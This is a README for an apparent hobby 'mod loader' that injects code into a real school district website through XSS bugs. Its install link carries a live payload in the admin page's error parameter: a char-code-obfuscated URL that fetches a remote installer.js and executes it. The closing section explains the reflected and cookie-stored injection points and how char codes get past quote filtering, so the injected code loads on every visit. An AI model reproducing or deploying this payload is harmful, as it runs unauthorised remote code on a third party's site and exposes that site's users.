${{\color{#a80f1f}\Huge{\textsf{R}}}}{{\color{#a80d24}\Huge{\textsf{H}}}}{{\color{#a80c2a}\Huge{\textsf{S}}}}{{\color{#a80b2e}\Huge{\textsf{-}}}}{{\color{#a70c33}\Huge{\textsf{M}}}}{{\color{#a70d38}\Huge{\textsf{o}}}}{{\color{#a60f3c}\Huge{\textsf{d}}}}{{\color{#a51241}\Huge{\textsf{l}}}}{{\color{#a31445}\Huge{\textsf{o}}}}{{\color{#a21749}\Huge{\textsf{a}}}}{{\color{#a01a4d}\Huge{\textsf{d}}}}{{\color{#9e1d51}\Huge{\textsf{e}}}}{{\color{#9c2055}\Huge{\textsf{r}}}}$
<br><br>An extension for the RHS website allowing you to install plugins and code. This is done by taking advantage of multiple HTML injection bugs in the website.

Supported on every device. An electron app will also be added to the releases tab at some point.
The Modloader itself will automatically update, but the electron app might need some app level changes to push to releases

> [!WARNING]  
> ***-- COOKIES WILL NOT WORK ON DAYS WITHOUT SCHOOL --***

## Installing
<a href="https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=<script>fetch(String.fromCharCode(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,80,111,121,79,122,107,47,82,72,83,45,77,111,100,108,111,97,100,101,114,47,109,97,105,110,47,105,110,115,116,97,108,108,101,114,46,106,115)).then(response=>response.text()).then(d=>(Function(d))())</script>">
  <img src="images/rps-RHS-watch.png" width="100" height="100" alt="Click To Install">
</a><br><br>Click the circle.

## Features
- Completely custom theme/plugin support using js/css with headers for name, author, description, and version
- Saving state of enabled plugins/themes and loading them on site launch
- CTRL + Y keybind to wipe everything in the case of something going wrong or a mod goes haywire
- Floating Monaco text editor window (vscode) built in to the site to develop and edit mods in-site
- As this is unfinished, this is not the full list of features. more will be added soon.

## Currently working on:
- Timer improvements & Bunch of smaller mods [DONE, Will be pushed to store, check ``/mods``]
- Store to one-click download mods, the Mod Library [Being designed]

## Planned (by priority)
- Groups of mods in folders where the entire folder can be toggled on/off
- Store should have some sort of account based verification but accounts get blocked because the domain administrator has to allow sign-ins. I'm not exactly sure how to get around this.
   - The account based system for store will be postponed until later, the plan to do so is using external email verification via an external account, probably automated with something like firebase.
- Electron app

# [MOD MAKING GUIDE](https://github.com/PoyOzk/RHS-Modloader/wiki)

## How this works

I have found two ways to add HTML onto the RHS website:

- Through the admin website
- By storing HTML in cookies

These are both forms of XSS as they allow self script injection.

The admin login for the RHS Website lets you directly add code to it using the [URL's error message](https://app.ridgewood.k12.nj.us/admin/index.php?username=&error=%3Ch1%3EHello%20RHS!%3C/h1%3E),
and the main website allows it through the custom class names, which isn't handled properly. This is also stored as cookies instead of in the URL, where your schedule is also stored. This means custom code loads every time the website does.

While both of these don't like it when you add code directly (they cancel quotes), making strings from char codes is a very nice alternative and runs well.
